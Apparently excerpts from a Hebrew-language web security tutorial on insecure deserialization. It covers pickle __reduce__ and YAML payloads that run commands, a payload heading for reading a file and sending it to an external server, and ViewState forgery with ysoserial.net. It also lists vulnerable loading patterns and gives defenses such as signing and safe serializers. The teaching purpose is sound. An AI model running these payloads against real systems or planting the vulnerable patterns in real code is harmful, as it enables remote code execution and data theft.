...
class MaliciousObject:
    def __reduce__(self):
        # __reduce__ returns a tuple of (callable, args)
        # Python will call the callable with args during deserialization
        return (os.system, ("id",))
...
# When someone performs deserialization - the command will run
pickle.loads(payload)
# uid=1000(attacker) gid=1000(attacker)
```

![איור המתאר כיצד pickle.loads על בתים לא מהימנים קורא למתודה reduce שמחזירה זוג של callable וארגומנטים, ו-Python מריץ אותם בזמן הפענוח ומקבל הרצת קוד](../../../images/illustrations/webadv-7-4-pickle-reduce.svg)
...
```python
# Payload 2: read a file and send it to an external server
...
```python
# Payload 3: using subprocess (more reliable than os.system)
class SubprocessRCE:
    def __reduce__(self):
        import subprocess
...
```python
# 1. Flask Sessions - if the SECRET_KEY is compromised
# Flask uses itsdangerous, which is based on pickle
from flask import Flask, session
app = Flask(__name__)
app.secret_key = "weak_key"  # if the attacker knows the key

# 2. Redis/Memcached caching
import redis
r = redis.Redis()
r.set("user_session", pickle.dumps(user_data))  # vulnerable!
user_data = pickle.loads(r.get("user_session"))  # dangerous!

# 3. Message Queues (Celery, RabbitMQ)
# Celery uses pickle as the default serializer
...
import numpy as np
np.save("data.npy", array)  # uses pickle
np.load("data.npy", allow_pickle=True)  # dangerous!

# 5. Machine Learning models
import joblib
joblib.dump(model, "model.pkl")  # pickle
model = joblib.load("model.pkl")  # dangerous!
```
...
def update_profile():
    # Get serialized data from the user - vulnerable!
...
```yaml
# Payload 1: run a command with os.system
!!python/object/apply:os.system
- "id"

# Payload 2: using subprocess
!!python/object/apply:subprocess.check_output
- - "whoami"

# Payload 3: read a file
...
def update_config():
    ...
    # Using yaml.load without a Loader - vulnerable!
...
Safer:
- DataContractSerializer (with restrictions)
- XmlSerializer (with restrictions)
- JSON.NET (with correct settings)
```
...
### הexploit ViewState עם Machine Key
...
```bash
# Create a signed ViewState with ysoserial.net
...
```
# Common locations:
# 1. web.config (LFI, backups, Git exposure)
# 2. Machine.config (server-level)
# 3. IIS configuration
# 4. Hardcoded keys in the code

# Tools:
# Blacklist3r - checks known Machine Keys
...
```python
# Magic bytes of pickle protocols
# Protocol 0: readable characters (S'string'\n)
# Protocol 2: \x80\x02
# Protocol 3: \x80\x03
# Protocol 4: \x80\x04
# Protocol 5: \x80\x05
...
# If pickle is required - use hmac for signing
import hmac
import hashlib
...
```csharp
// Instead of BinaryFormatter - use System.Text.Json
using System.Text.Json;

string json = JsonSerializer.Serialize(myObject);
MyClass obj = JsonSerializer.Deserialize<MyClass>(json);

// Or DataContractSerializer with a whitelist
...
```xml
<!-- web.config - enable encryption and signing -->
<system.web>
...
| .NET ViewState | LosFormatter | ysoserial.net -p ViewState | הצפנה + signature |
